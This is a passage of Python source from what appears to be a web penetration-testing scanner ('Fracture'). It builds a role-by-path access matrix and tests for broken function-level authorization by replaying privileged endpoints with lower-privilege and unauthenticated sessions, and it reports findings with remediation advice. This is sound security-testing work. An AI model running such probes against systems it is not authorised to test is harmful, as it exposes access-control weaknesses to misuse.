            _seen_paths.add(_p)
            _sm_path_keys.append(_p)
    crawled_paths = _sm_path_keys

    # Only skip if truly no paths discovered anywhere
    if not crawled_paths:
        vc.status(phase, "Access Matrix", "complete", "No paths discovered — skipped", 0, 0)
        return {}

    vc.status(phase, "Access Matrix", "running", "Building role sessions", 0, 1)
    print(f"\n{'─'*60}")
    print(f"  Phase 20: Multi-Credential Access Matrix")
    print(f"{'─'*60}")

    role_sessions = {}
    if prebuilt_sessions:
        # Reuse sessions already authenticated during the context loop — no re-auth needed.
        for role_label, r_sess in prebuilt_sessions.items():
            if r_sess is None:
                r_sess = requests.Session()
                r_sess.verify = verify_ssl
            role_sessions[role_label] = r_sess
            print(f"  → Role '{role_label}' session reused (no re-authentication)")
    else:
        def _build_role_session(role_cfg: dict):
            r_auth = _copy.deepcopy(cfg.get("auth", {}))
            r_auth["enabled"]  = True
            r_auth["username"] = role_cfg.get("username", r_auth.get("username", ""))
            r_auth["password"] = role_cfg.get("password", r_auth.get("password", ""))
            r_cfg = _copy.deepcopy(cfg)
            r_cfg["auth"] = r_auth
            return _build_auth_session(r_cfg, "auth", no_interactive=True)

        for role_cfg in auth_matrix:
            role = role_cfg.get("role") or f"role{len(role_sessions)+1}"
            r_sess = _build_role_session(role_cfg)
            if r_sess is None:
                r_sess = requests.Session()
                r_sess.verify = verify_ssl
            role_sessions[role] = r_sess
            print(f"  → Role '{role}' session built (user: {role_cfg.get('username','?')})")

    unauth_sess = requests.Session()
    unauth_sess.verify = verify_ssl
    role_sessions["unauthenticated"] = unauth_sess
    all_roles  = list(role_sessions.keys())
    cred_roles = [r for r in all_roles if r != "unauthenticated"]

    print(f"  Testing {len(crawled_paths)} paths × {len(all_roles)} roles")
    vc.status(phase, "Access Matrix", "running", f"Testing {len(crawled_paths)} paths", 0, len(crawled_paths))

    # Use a growable list so redirect destinations discovered during probing
    # are appended and probed in the same pass (one level of expansion only;
    # destinations that themselves redirect are recorded but not followed further).
    _am_paths = list(crawled_paths)
    _am_seen  = set(crawled_paths)    # dedup set — paths already in the list
    path_access = []
    idx = 0
    while idx < len(_am_paths):
        path = _am_paths[idx]
        idx += 1
        # Paths from structure_map are always relative (e.g. "/admin"); normalize
        if path.startswith("http"):
            url = path
            rel = urllib.parse.urlparse(path).path or "/"
        else:
            rel = path if path.startswith("/") else "/" + path
            url = base_url + rel
        access = {}
        for role, r_sess in role_sessions.items():
            try:
                r = r_sess.get(url, timeout=timeout, allow_redirects=False,
                               headers={"Accept": "text/html,application/json"})
                access[role] = r.status_code
                # Collect redirect destination so the resolved URL is also probed.
                # Only expand paths that are on the same host (in-scope).
                if r.status_code in (301, 302, 303, 307, 308):
                    _loc = r.headers.get("Location", "").strip()
                    if _loc:
                        _dest = urllib.parse.urljoin(url, _loc)
                        _dest_parsed = urllib.parse.urlparse(_dest)
                        _dest_netloc = _dest_parsed.netloc
                        _base_netloc = urllib.parse.urlparse(base_url).netloc
                        if _dest_netloc == _base_netloc:
                            _dest_path = _dest_parsed.path or "/"
                            if _dest_path not in _am_seen:
                                _am_seen.add(_dest_path)
                                _am_paths.append(_dest_path)
            except Exception:
                try:
                    r = r_sess.head(url, timeout=max(timeout // 2, 3),
                                    allow_redirects=False)
                    access[role] = r.status_code
                except Exception:
                    access[role] = 0
        path_access.append({"path": rel, "url": url, "access": access})
        vc.status(phase, "Access Matrix", "running", f"Path {idx}/{len(_am_paths)}", idx, len(_am_paths))

    def _ok(status):
        return isinstance(status, int) and status in (200, 201, 202, 204)

    privilege_counts = {
        role: sum(1 for ep in path_access if _ok(ep["access"].get(role)))
        for role in all_roles
    }
    most_privileged = (
        max(cred_roles, key=lambda r: privilege_counts[r]) if cred_roles else None
    )
    print(f"  Most privileged: {most_privileged} ({privilege_counts.get(most_privileged, 0)} paths)")

    for ep in path_access:
        ep_access   = ep["access"]
        unauth_st   = ep_access.get("unauthenticated")
        any_authed  = any(_ok(ep_access.get(r)) for r in cred_roles)

        if _ok(unauth_st) and any_authed:
            out.add_finding(
                title="Unauthenticated Access to Protected Path",
                url=ep["url"], port=port, risk="MEDIUM",
                description=(
                    f"Path {ep['path']} returned HTTP {unauth_st} without "
                    f"authentication but returns 2xx when authenticated. "
                    f"Missing or insufficient access control."
                ),
                output=f"URL: {ep['url']} | Unauth: HTTP {unauth_st}",
                command=f"GET {ep['url']} (no auth)",
                affected=ep["url"],
                owasp="A01:2021 Broken Access Control", nist="AC-3",
                remediation="Enforce authentication middleware on all non-public routes.",
            )

        if most_privileged and len(cred_roles) > 1:
            high_ok = _ok(ep_access.get(most_privileged))
            if high_ok:
                for low_role in cred_roles:
                    if low_role == most_privileged:
                        continue
                    if _ok(ep_access.get(low_role)):
                        out.add_finding(
                            title=f"BFLA: Role '{low_role}' Can Access Admin Path",
                            url=ep["url"], port=port, risk="HIGH",
                            description=(
                                f"Role '{low_role}' can access {ep['path']} which "
                                f"is also accessible to '{most_privileged}' (most "
                                f"privileged). No effective role-based access control."
                            ),
                            output=(
                                f"URL: {ep['url']} | "
                                f"{most_privileged}: HTTP {ep_access[most_privileged]} | "
                                f"{low_role}: HTTP {ep_access[low_role]}"
                            ),
                            command=f"GET {ep['url']} (role: {low_role})",
                            affected=ep["url"],
                            owasp="A01:2021 Broken Access Control", nist="AC-6",
                            remediation="Implement role-based access control (RBAC).",
                        )

    access_matrix_data = {
        "roles":            all_roles,
        "most_privileged":  most_privileged,
        "privilege_counts": privilege_counts,
        "paths":            path_access,
    }
    try:
        (project_dir / "access_matrix.json").write_text(
            json.dumps(access_matrix_data, indent=2)
        )
        print(f"  access_matrix.json saved to {project_dir}/")
    except Exception as exc:
        vc.err(f"[access_matrix] Failed to save access_matrix.json: {exc}")

    vc.status(phase, "Access Matrix", "complete", "Done", len(crawled_paths), len(crawled_paths))
    vc.log("[access_matrix] Phase complete", "SUCCESS")
    return access_matrix_data


def _phase_bfla(target: dict, cfg: dict, pm: ProgressManager,
                out: OutputManager,
                role1_endpoints: list,
                ctx_sess: "requests.Session | None",
                ctx_label: str) -> None:
    """
    Phase 21: Broken Function Level Authorization (BFLA).

    Replays every HTTP 200 endpoint discovered during Role 1's scan using the
    current (lower-privilege or unauthenticated) role's session. Any endpoint
    that returns HTTP 200 for this role is a BFLA candidate: the server exposes
    a function that should be restricted to a higher-privilege role but fails to
    enforce that restriction.

    Risk assignment:
      CRITICAL — response body is identical to Role 1's (same data returned)
      HIGH     — response is 200 but body differs (function reached, different view)
    """
    phase   = "bfla"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    probe_sess = ctx_sess if ctx_sess is not None else requests.Session()
    total   = len(role1_endpoints)

    vc.status(phase, "BFLA Testing", "running", f"Testing {total} Role 1 endpoints", 0, total)
    vc.log(
        f"[bfla] Testing {total} Role 1 endpoints as [{ctx_label}]", "INFO")

    # Collect all accessible endpoints first, then emit one merged finding per
    # risk tier so that all affected relative URLs are consolidated into a single
    # finding rather than producing one finding per endpoint.
    _bfla_critical: list = []   # body-identical to Role 1
    _bfla_high:     list = []   # HTTP 200 but body differs

    for idx, ep in enumerate(role1_endpoints):
        ep_url = ep["url"]
        vc.status(phase, "BFLA Testing", "running",
                  f"Endpoint {idx+1}/{total}", idx + 1, total)
        try:
            r = probe_sess.get(ep_url, timeout=timeout, allow_redirects=False)
        except Exception:
            continue

        if r.status_code != 200:
            continue

        body_hash  = hash(r.text[:4096])
        body_match = (body_hash == ep.get("body_hash")) and (
            abs(len(r.text) - ep.get("body_len", 0)) < 64)
        bucket = _bfla_critical if body_match else _bfla_high
        bucket.append({
            "ep":    ep,
            "url":   ep_url,
            "r_len": len(r.text),
            "r_status": r.status_code,
        })
        tier = "CRITICAL" if body_match else "HIGH"
        vc.log(f"[bfla] BFLA {tier}: {ep_url} accessible as [{ctx_label}]", "SUCCESS")

    def _emit_bfla_tier(hits: list, risk: str, match_note: str) -> None:
        if not hits:
            return
        role1_label = hits[0]["ep"]["role1_label"]
        affected_urls = "\n".join(h["url"] for h in hits)
        output_lines  = [
            f"  {h['url']}  |  Role 1 ({role1_label}): HTTP {h['ep']['status']} "
            f"({h['ep'].get('body_len', '?')} bytes)  |  "
            f"Role ({ctx_label}): HTTP {h['r_status']} ({h['r_len']} bytes)"
            for h in hits
        ]
        out.add_finding(
            title="Broken Function Level Authorization (BFLA)",
            url=target["url"],
            port=target["port"],
            risk=risk,
            description=(
                f"Role '{ctx_label}' successfully accessed {len(hits)} endpoint(s) "
                f"that returned HTTP 200 for the most privileged role "
                f"('{role1_label}'). The server did not enforce role-level access "
                f"control on these functions. {match_note}"
            ),
            output="\n".join(output_lines),
            sources="fracture-bfla",
            service=target["scheme"],
            affected=affected_urls,
            owasp="A01:2025 Broken Access Control",
            nist="AC-3",
            remediation=(
                "Implement server-side function-level access control checks for every "
                "endpoint. Verify the authenticated identity's role before executing "
                "privileged operations — do not rely solely on hiding URLs or UI elements."
            ),
        )

    _emit_bfla_tier(
        _bfla_critical, "CRITICAL",
        "Response body is identical to Role 1's response — the same data "
        "is returned regardless of privilege level.",
    )
    _emit_bfla_tier(
        _bfla_high, "HIGH",
        "Response was HTTP 200 but body differs from Role 1's — the function "
        "endpoint is reachable; data may be scoped differently.",
    )

    findings_count = len(_bfla_critical) + len(_bfla_high)
    vc.status(phase, "BFLA Testing", "complete", "Done", total, total)
    vc.log(
        f"[bfla] Phase complete — {findings_count} accessible endpoint(s) "
        f"({len(_bfla_critical)} CRITICAL, {len(_bfla_high)} HIGH) for [{ctx_label}]",
        "SUCCESS")


# Privileged-path keywords used when scoring role access depth.
_PRIV_PATH_RE = re.compile(
    r'admin|config|manage|settings|dashboard|users|accounts|reports|'
    r'billing|finance|audit|internal|deploy|security|api/admin|api/v\d+/admin|'
    r'superuser|staff|operator|moderator|panel|control',
    re.I,
)
# Patterns that indicate access denial in a 200 response body.
# Checked in the page <title> first (lower false-positive rate) then body text.
_DENIAL_RE = re.compile(
    r'<title[^>]*>[^<]*(?:access\s+denied|403|forbidden|unauthorized|not\s+authorized)[^<]*</title'
    r'|'
    r'\b(access\s+denied|403\s+forbidden|401\s+unauthorized|permission\s+denied|'
    r'not\s+authorized|unauthorized\s+access|login\s+required|'
    r'sign[\s\-]?in\s+required|'
    r'you\s+(?:don\'?t|do\s+not)\s+have\s+(?:permission|access))\b',
    re.IGNORECASE,
)
# Score threshold: a new role must beat the current discovery leader by this
# factor before its busting results are considered more authoritative.
_DISCOVERY_RESCORE_THRESHOLD = 1.15

# Phases run for every credential context (full scan for role 1).
# Reduced contexts (roles 2..n and unauthenticated) only run this subset.
_REDUCED_SCAN_PHASES: frozenset = frozenset({
    "headers", "shcheck", "auth_bypass", "account_lockout", "session", "csrf", "bfla",
})


def _prompt_multi_role_setup(auth_cfg: dict) -> int:
    """
    Ask how many authenticated user roles to test.
    If n > 1 and credentials are already configured, confirm they belong to the
    most permissive user; if not, prompt for replacement credentials.
    Modifies auth_cfg in-place when new credentials are provided.
    Returns the number of authenticated roles (0 = unauthenticated only).
    """
    raw = vc.prompt(
        "How many authenticated user roles will be tested (not including unauthenticated)?",
        prompt_type="text",
        skippable=True,
    ).strip()
    if not raw:
        return 0
    try:
        n = int(raw)
        if n < 0:
            n = 0
    except ValueError:
        n = 0

    if n == 0:
        return 0

    _has_creds = bool(
        auth_cfg.get("enabled") and (auth_cfg.get("username") or auth_cfg.get("auth_token"))
    )

    if _has_creds and n > 1:
        _u = auth_cfg.get("username") or "(token)"
        _ans = vc.prompt(
            f"Credentials are configured for '{_u}'. Are these for the most permissive user?",
            prompt_type="confirm",
            options=["Yes", "No"],
        ).strip().lower()
        if _ans in ("no", "n", "2"):
            _has_creds = False

    if not _has_creds:
        _uname = vc.prompt("Username (most permissive user — role 1)", prompt_type="text").strip()
        _pwd   = vc.prompt("Password (most permissive user — role 1)", prompt_type="password")
        auth_cfg["enabled"]      = True
        auth_cfg["username"]     = _uname
        auth_cfg["password"]     = _pwd

    # Always ask for role name — required for both TTY and Crucible modal context
    _lbl = vc.prompt(
        "Role name for role 1 (e.g. Admin, Editor, Staff)",
        prompt_type="text",
    ).strip() or "elevated"
    auth_cfg["_role_label"] = _lbl

    return n


def _prompt_next_role_creds(role_num: int, total: int) -> dict:
    """
    Prompt for credentials for role_num of total authenticated roles.
    Returns {"role": label, "username": u, "password": p}.
    """
    _uname = vc.prompt(
        f"Username (role {role_num}/{total})", prompt_type="text"
    ).strip() or f"user{role_num}"
    _pwd  = vc.prompt(f"Password (role {role_num}/{total})", prompt_type="password")
    _lbl  = vc.prompt(
        f"Role name for role {role_num} (e.g. User, Manager, Viewer)",
        prompt_type="text",
    ).strip() or f"user{role_num}"
    return {"role": _lbl, "username": _uname, "password": _pwd}


def main() -> None:
    args = _parse_args()

    if args.list_phases:
        print("\nFracture Phases:\n")
        for name, desc in PHASE_LIST:
            print(f"  {name:<20} {desc}")
        print()
        return

    # Load settings
    settings = _load_settings(args.settings or "")
    cfg      = settings["scan"]

    # Apply CLI overrides
    if args.url:
        cfg["target_url"] = args.url
    if args.project:
        cfg["project"] = args.project
    if args.threads:
        cfg["threads"] = args.threads
    if args.timeout:
        cfg["timeout"] = args.timeout
    if args.no_injection:
        cfg["phases"]["injection"] = False
    if args.no_vulnscan:
        cfg["phases"]["vulnscan"] = False
    if args.no_ffuf:
        cfg["phases"]["ffuf"] = False
    if args.no_auth:
        for auth_phase in ("auth_recon", "authorization", "session", "csrf", "cross_user"):
            cfg["phases"][auth_phase] = False
    if args.browser_auth:
        cfg["browser_auth"] = True
    if args.chromedriver:
        cfg["chromedriver_path"] = args.chromedriver

    # CLI auth overrides
    if args.username:
        cfg["auth"]["enabled"]   = True
        cfg["auth"]["username"]  = args.username
        cfg["auth"]["password"]  = args.password or ""
        cfg["auth"]["auth_type"] = args.auth_type or "form"
    if args.login_url:
        cfg["auth"]["login_url"] = args.login_url
    if args.auth_token:
        cfg["auth"]["enabled"]    = True
        cfg["auth"]["auth_token"] = args.auth_token

    # Auto-compute structured project path from engagement fields if not explicitly set
    if not cfg.get("project"):
        eng = settings.get("engagement", {})
        cfg["project"] = str(_build_project_dir(
            eng.get("client_short", ""),
            eng.get("start_date", ""),
            "fracture",
        ))

    # Determine target URLs
    target_url  = cfg.get("target_url", "").rstrip("/")
    target_urls = [u.rstrip("/") for u in cfg.get("target_urls", []) if u]
    if target_url:
        target_urls = [target_url] + [u for u in target_urls if u != target_url]
    # Deduplicate while preserving order
    _seen_urls: set = set()
    target_urls = [u for u in target_urls if u not in _seen_urls and not _seen_urls.add(u)]
    if not target_urls:
        vc.log("No target URL specified. Use --url or set target_url in settings.", "ERROR")
        sys.exit(1)

    if not vc.managed:
        _print_banner()

    vc.log(f"Fracture v{VERSION} starting", "INFO")
    vc.log(f"Target(s): {', '.join(target_urls)}", "INFO")
    vc.log(f"Project:   {cfg['project']}", "INFO")
    vc.log(f"Phases:    {', '.join(k for k, v in cfg['phases'].items() if v)}", "INFO")

    # Scope hostnames: set of all configured target hostnames
    _scope_hostnames: set = {
        urllib.parse.urlparse(u).hostname for u in target_urls if u
    }

    # Pending URL queue — grows when in-scope redirects are discovered during scanning
    _pending_urls:        list = list(target_urls)
    _processed_urls:      set  = set()
    _redirect_discovered: set  = set()  # tracks redirect-discovered target URLs
    _pending_idx = 0

    # Start adaptive concurrency monitor (adjusts _SCAN_SEM based on CPU/RAM)
    _start_concurrency_monitor(_SCAN_SEM)

    # ── Multi-role testing setup ─────────────────────────────────────────────
    # _n_roles: number of authenticated roles to test (0 = unauthenticated only)
    # _collected_roles: grows as the user provides credentials during the scan;
    #   reused across targets so the user is only prompted once per role.
    _n_roles: int = 0
    _collected_roles: list = []  # [{"role": label, "username": u, "password": p}, ...]
    # Persists built auth sessions across while-loop iterations so that redirect-discovered
    # secondary targets reuse the same sessions rather than re-authenticating.
    # Keys: 0..n for role_idx, "auth2" for the secondary auth config.
    _role_sessions: dict = {}
    # Discovery leader tracking — the role whose busting results are considered most
    # authoritative. Initialised to empty; set to the first role that runs busting.
    _discovery_leader: str = ""
    _discovery_leader_score: dict = {"score": 0, "n200": 0, "n200_priv": 0}
    # Sessions of all roles that have completed their context, keyed by role label.
    # Used by _retroactive_probe to populate access matrix entries for newly found URLs.
    _completed_role_sessions: dict = {}

    _am = cfg.get("auth_matrix") or []
    if _VANTAGE_MANAGED and _am:
        # Roles were pre-defined in the Crucible project — load them directly,
        # no prompt needed.
        _n_roles = len(_am)
        _collected_roles = [
            {
                "role":     r.get("role") or ("elevated" if i == 0 else f"user{i}"),
                "username": r.get("username", ""),
                "password": r.get("password", ""),
            }
            for i, r in enumerate(_am)
        ]
        # Ensure cfg["auth"] reflects role 1 so _build_auth_session works
        if _collected_roles:
            cfg["auth"]["enabled"]  = True
            cfg["auth"]["username"] = _collected_roles[0]["username"]
            cfg["auth"]["password"] = _collected_roles[0]["password"]
        vc.log(
            f"[multi-role] {_n_roles} role(s) loaded from project settings — skipping prompt",
            "INFO",
        )
        # Seed the global role list immediately so preliminary access_matrix
        # writes during recon/gobuster already carry the correct column names.
        _all_roles_ctx[:] = [r["role"] for r in _collected_roles]
        if "unauthenticated" not in _all_roles_ctx:
            _all_roles_ctx.append("unauthenticated")
    else:
        _n_roles = _prompt_multi_role_setup(cfg["auth"])
        if _n_roles >= 1:
            _r1_lbl = cfg["auth"].pop("_role_label", None) or cfg["auth"].get("username") or "elevated"
            _collected_roles.append({
                "role":     _r1_lbl,
                "username": cfg["auth"].get("username", ""),
                "password": cfg["auth"].get("password", ""),
            })
            # Seed with at least role 1 + unauthenticated; extended as more roles are added
            _all_roles_ctx[:] = [r["role"] for r in _collected_roles]
            if "unauthenticated" not in _all_roles_ctx:
                _all_roles_ctx.append("unauthenticated")

    while _pending_idx < len(_pending_urls):
        raw_url      = _pending_urls[_pending_idx]
        _pending_idx += 1
        if not raw_url or raw_url in _processed_urls:
            continue
        _processed_urls.add(raw_url)
        _is_redirect_target = raw_url in _redirect_discovered
        # Reset per-target discovery state for non-redirect (genuine new primary targets).
        # Redirect-discovered secondaries inherit the leader from their parent scan so
        # session reuse works; genuine new targets start fresh.
        if not _is_redirect_target:
            _discovery_leader = ""
            _discovery_leader_score = {"score": 0, "n200": 0, "n200_priv": 0}
            _completed_role_sessions = {}

        target = _parse_target(raw_url)
        project_dir = Path(cfg["project"]).resolve()
        if len(target_urls) > 1 or _is_redirect_target:
            # Sub-directory per target
            safe_host = _RE_UNSAFE_FNAME.sub("_", target["hostname"])
            project_dir = project_dir / safe_host

        out = OutputManager(str(project_dir))
        out.base_url = target["url"]
        pm  = ProgressManager(project_dir / "checkpoint.json")
        eng = settings.get("engagement", {})
        _write_project_meta(
            Path(cfg["project"]).resolve(),
            tool="fracture",
            client_short=eng.get("client_short", ""),
            year=(eng.get("start_date", "") or "")[:4] or datetime.now().strftime("%Y"),
            version=VERSION,
        )

        if pm.get_state()["completed_phases"]:
            vc.log("Checkpoint found — resuming from previous run", "INFO")

        vc.log(f"Output directory: {project_dir}", "INFO")

        # Build sessions — all sessions are scope-enforcing
        # Build sessions — all sessions are scope-enforcing.
        # For redirect-discovered secondary targets, reuse the auth session that was built
        # for the primary target scan so that the secondary URL is scanned with the same
        # authenticated context rather than triggering a fresh login flow.  Sessions are
        # stored in _role_sessions (keyed by role_idx / "auth2") outside the while loop.
        _r1_label  = _collected_roles[0]["role"] if _collected_roles else ""
        sess       = _make_session(cfg, _scope_hostnames)
        if _is_redirect_target and 0 in _role_sessions:
            auth_sess = _role_sessions[0]
            vc.log(f"[auth] Reusing role-1 session for redirect target {raw_url}", "INFO")
        else:
            auth_sess = _build_auth_session(cfg, "auth", _scope_hostnames,
                                            role_label=_r1_label,
                                            no_interactive=_is_redirect_target)
            if auth_sess:
                _role_sessions[0] = auth_sess
        if _is_redirect_target and "auth2" in _role_sessions:
            auth2_sess = _role_sessions["auth2"]
        else:
            auth2_sess = _build_auth_session(cfg, "auth2", _scope_hostnames,
                                             no_interactive=_is_redirect_target)
            if auth2_sess:
                _role_sessions["auth2"] = auth2_sess

        _AUTH_HDR_NAMES = frozenset({
            "authorization", "x-auth-token", "x-api-key", "x-csrf-token",
            "x-access-token", "x-session-token", "token",
        })
        _SESSION_TRUNC = 72   # max chars before value is truncated in output

        def _log_session_info(sess_obj: "requests.Session", label: str) -> None:
            """Print cookies, auth headers, and basic-auth in a readable format."""
            def _trunc(v: str) -> str:
                return v if len(v) <= _SESSION_TRUNC else v[:_SESSION_TRUNC] + "…"

            cookies = list(sess_obj.cookies)
            if cookies:
                vc.log(f"[auth:{label}]   Cookies ({len(cookies)}):", "INFO")
                for ck in cookies:
                    flags: list = []
                    if ck.domain:
                        flags.append(ck.domain)
                    if ck.path and ck.path != "/":
                        flags.append(f"path={ck.path}")
                    if ck.secure:
                        flags.append("secure")
                    try:
                        if ck.has_nonstandard_attr("HttpOnly"):
                            flags.append("httponly")
                    except Exception:
                        pass
                    flag_str = f"  ({', '.join(flags)})" if flags else ""
                    vc.log(
                        f"[auth:{label}]     ◦ {ck.name} = "
                        f"{_trunc(ck.value or '')}{flag_str}",
                        "INFO",
                    )

            auth_hdrs = [
                (k, v) for k, v in sess_obj.headers.items()
                if k.lower() in _AUTH_HDR_NAMES
            ]
            if auth_hdrs:
                vc.log(f"[auth:{label}]   Headers:", "INFO")
                for k, v in auth_hdrs:
                    vc.log(f"[auth:{label}]     ◦ {k}: {_trunc(v)}", "INFO")

            if sess_obj.auth is not None:
                try:
                    _u, _p = sess_obj.auth
                    vc.log(
                        f"[auth:{label}]   Basic auth: {_u} / {'*' * min(len(_p), 8)}",
                        "INFO",
                    )
                except Exception:
                    vc.log(f"[auth:{label}]   Basic auth: (set)", "INFO")

        def _report_auth_status(sess_obj: "requests.Session | None",
                                auth_cfg: dict, label: str,
                                primary_enabled: bool = False) -> bool:
            """Log auth result. Returns True if session carries auth signals."""
            if not auth_cfg.get("enabled"):
                if label == "secondary" and primary_enabled:
                    return False
                vc.log(f"[auth:{label}] Authentication not attempted", "INFO")
                return False
            if sess_obj is None:
                vc.log(f"[auth:{label}] Authentication failed — continuing with unauthenticated testing only", "ERROR")
                return False
            _has_cookie  = bool(sess_obj.cookies)
            _has_header  = any(
                k.lower() in _AUTH_HDR_NAMES
                for k in sess_obj.headers
            )
            _has_auth    = sess_obj.auth is not None
            if _has_cookie or _has_header or _has_auth:
                vc.log(f"[auth:{label}] Authentication successful", "SUCCESS")
                _log_session_info(sess_obj, label)
                return True
            vc.log(f"[auth:{label}] Authentication failed — continuing with unauthenticated testing only", "ERROR")
            return False

        _primary_auth_enabled = bool(cfg.get("auth", {}).get("enabled"))
        _primary_ok  = _report_auth_status(auth_sess,  cfg.get("auth",  {}), "primary")
        _report_auth_status(auth2_sess, cfg.get("auth2", {}), "secondary",
                            primary_enabled=_primary_auth_enabled)

        # Browser-auth fallback is handled inside _build_auth_session (form_login path)
        # where _browser_assisted_login is in scope as a closure. If browser auth
        # succeeded there, auth_sess is already a valid session. If it returned None,
        # we proceed unauthenticated — no further action needed here.

        # Pre-scan connectivity check — retry up to 5 times before proceeding
        _alive_delays = [0, 5, 10, 15, 20]
        for _alive_attempt, _alive_delay in enumerate(_alive_delays, 1):
            if _alive_delay:
                vc.log(
                    f"[pre-scan] Target not responding — waiting {_alive_delay}s before "
                    f"retry (attempt {_alive_attempt}/{len(_alive_delays)})...", "WARNING"
                )
                time.sleep(_alive_delay)
            try:
                _alive_r = sess.get(target["url"], timeout=10, allow_redirects=True)
                vc.log(f"[pre-scan] Target reachable (HTTP {_alive_r.status_code})", "INFO")
                break
            except Exception as _alive_e:
                if _alive_attempt == len(_alive_delays):
                    vc.log(
                        f"[pre-scan] Target did not respond after {len(_alive_delays)} "
                        f"attempts — proceeding anyway", "WARNING"
                    )
                else:
                    vc.log(f"[pre-scan] Attempt {_alive_attempt} failed: {_alive_e}", "WARNING")

        # Redirect tracking — accumulates in-scope redirect destinations found during this scan
        _in_scope_new: list = []
        _attach_redirect_hook(sess, _scope_hostnames, target, out, _in_scope_new)
        if auth_sess:
            _attach_redirect_hook(auth_sess, _scope_hostnames, target, out, _in_scope_new)
        if auth2_sess:
            _attach_redirect_hook(auth2_sess, _scope_hostnames, target, out, _in_scope_new)

        # ------------------------------------------------------------------
        # Build per-credential contexts from auth_matrix + unauthenticated.
        # All non-privilege phases run once per context so that vulnerabilities
        # reachable only under elevated credentials are not missed.
        # Privilege-escalation phases (authorization, cross_user, access_matrix)
        # run once after all contexts — they require cross-role comparison and
        # must not be executed with a single elevated identity.
        # ------------------------------------------------------------------
        phases_enabled = cfg.get("phases", {})

        def _skip(phase_name: str) -> bool:
            if not phases_enabled.get(phase_name, False):
                vc.log(f"[{phase_name}] Phase disabled — skipping", "INFO")
                return True
            if pm.is_phase_complete(phase_name):
                vc.log(f"[{phase_name}] Already complete — skipping (checkpoint)", "INFO")
                return True
            return False

        # Build per-credential contexts
        # When _n_roles >= 1 (interactive multi-role mode):
        #   - Role 1 (most permissive): full scan, all phases.
        #   - Roles 2..n: reduced scan — authorization/session/bypass only,
        #     using role 1's discovered crawl data.
        #   - Unauthenticated: same reduced scan as roles 2..n.
        # When _n_roles == 0: existing auth_matrix behaviour (settings-file driven).
        _cred_contexts: list = []
        if _n_roles >= 1:
            # Role 1 — full scan (most permissive user)
            _r1 = _collected_roles[0]
            _r1_cfg = copy.deepcopy(cfg)
            _r1_cfg["auth"]["enabled"]  = True
            _r1_cfg["auth"]["username"] = _r1["username"]
            _r1_cfg["auth"]["password"] = _r1["password"]
            # Reuse the already-built auth_sess — role 1's cfg matches cfg["auth"],
            # so calling _build_auth_session again would re-run the full login flow
            # (including any interactive prompts) for a second time unnecessarily.
            _r1_as = auth_sess if isinstance(auth_sess, requests.Session) else \
                _build_auth_session(_r1_cfg, "auth", _scope_hostnames, role_label=_r1["role"])
            if _r1_as:
                _attach_redirect_hook(_r1_as, _scope_hostnames, target, out, _in_scope_new)
            _cred_contexts.append({
                "label": _r1["role"], "cfg": _r1_cfg, "auth_sess": _r1_as,
                "reduced": False, "multi_role": True, "role_idx": 0,
            })
            # Any roles already collected (e.g. second target, creds collected earlier)
            # auth_sess is intentionally left None here; it is built lazily at the
            # start of each context iteration so that browser-auth prompts for roles
            # 2..n appear AFTER role 1 finishes, not before any phases have run.
            for _ri, _rc in enumerate(_collected_roles[1:], start=1):
                _rn_cfg = copy.deepcopy(cfg)
                _rn_cfg["auth"]["enabled"]  = True
                _rn_cfg["auth"]["username"] = _rc["username"]
                _rn_cfg["auth"]["password"] = _rc["password"]
                _cred_contexts.append({
                    "label": _rc["role"], "cfg": _rn_cfg, "auth_sess": None,
                    "reduced": True, "multi_role": True, "role_idx": _ri,
                })
        else:
            # Existing settings-file auth_matrix behaviour
            for _rc in (cfg.get("auth_matrix") or []):
                _r_label = _rc.get("role") or f"ctx{len(_cred_contexts) + 1}"
                _r_cfg   = copy.deepcopy(cfg)
                _r_cfg["auth"]["enabled"]  = True
                _r_cfg["auth"]["username"] = _rc.get("username", "")
                _r_cfg["auth"]["password"] = _rc.get("password", "")
                _r_as    = _build_auth_session(_r_cfg, "auth", _scope_hostnames, role_label=_r_label)
                if _r_as:
                    _attach_redirect_hook(_r_as, _scope_hostnames, target, out, _in_scope_new)
                _cred_contexts.append({
                    "label": _r_label, "cfg": _r_cfg, "auth_sess": _r_as,
                    "reduced": False, "multi_role": False, "role_idx": -1,
                })
        # Unauthenticated context always last.
        # Reduced if multi-role mode (role 1 already ran the full scan).
        _r_unauth_cfg = copy.deepcopy(cfg)
        _r_unauth_cfg["auth"]["enabled"] = False
        _cred_contexts.append({
            "label": "unauthenticated", "cfg": _r_unauth_cfg, "auth_sess": None,
            "reduced": _n_roles >= 1, "multi_role": False, "role_idx": -1,
        })

        # Seed access_matrix.json with the full role list before scanning starts.
        # _write_structure_map fires repeatedly during recon/gobuster and calls
        # _write_preliminary_access_matrix(out, target, []).  Without seeding,
        # the roles list in access_matrix.json stays empty and the Crucible
        # frontend falls back to showing a single "Unauthenticated" column even
        # while an authenticated role is being tested.  The seed is written once
        # here so every subsequent preliminary write merges into (and preserves)
        # the correct column list.
        try:
            _seed_roles = [_c["label"] for _c in _cred_contexts]
            _write_preliminary_access_matrix(out, target, _seed_roles)
        except Exception:
            pass

        # Accumulators for post-context privilege phases
        _combined_auth_recon: dict = {"forms": [], "links": [], "resource_ids": []}
        _all_crawl_links:     list = []
        _discovered_creds_seen: set = set()  # avoid duplicate contexts from discovered creds
        # Crawl data from role 1 (most permissive); passed to reduced contexts so they
        # test accessibility to the same paths without re-crawling.
        _role1_crawl_data: dict = {"forms": [], "params": [], "links": []}
        # Discovery phase outputs — populated during Role 1's context, reused by all others.
        wc_baseline: object = None
        _wp_discovered_paths: list = []
        _ep_base: list = []
        # BFLA: endpoints that returned 200 for Role 1, tested against all other roles.
        # Each entry: {"url": str, "status": int, "body_len": int, "role1_label": str}
        _role1_accessible_endpoints: list = []
        # CDN/WAF detected by _phase_recon; used to modulate injection/testing phases.
        _scan_waf_cdn: str = ""

        # ── Per-credential context loop ─────────────────────────────────────
        for _ctx in _cred_contexts:
            _ctx_label = _ctx["label"]
            _scan_ctx["role"] = _ctx_label  # route structure_map statuses to this role's column
            _ctx_auth  = _ctx["auth_sess"]
            _ctx_cfg   = _ctx["cfg"]
            # True for roles 2..n and unauthenticated in multi-role mode.
            # Reduced contexts skip discovery/crawl/injection and most attack phases;
            # they only test access to paths already found by role 1.
            _is_reduced_ctx = _ctx.get("reduced", False)

            # Route tool output files into per-role subdirectories when multi-role
            # scanning is active so that results from different roles do not overwrite
            # each other (e.g. recon/Admin/gobuster_... vs recon/User/gobuster_...).
            out._output_role = _ctx_label if _n_roles >= 1 else ""

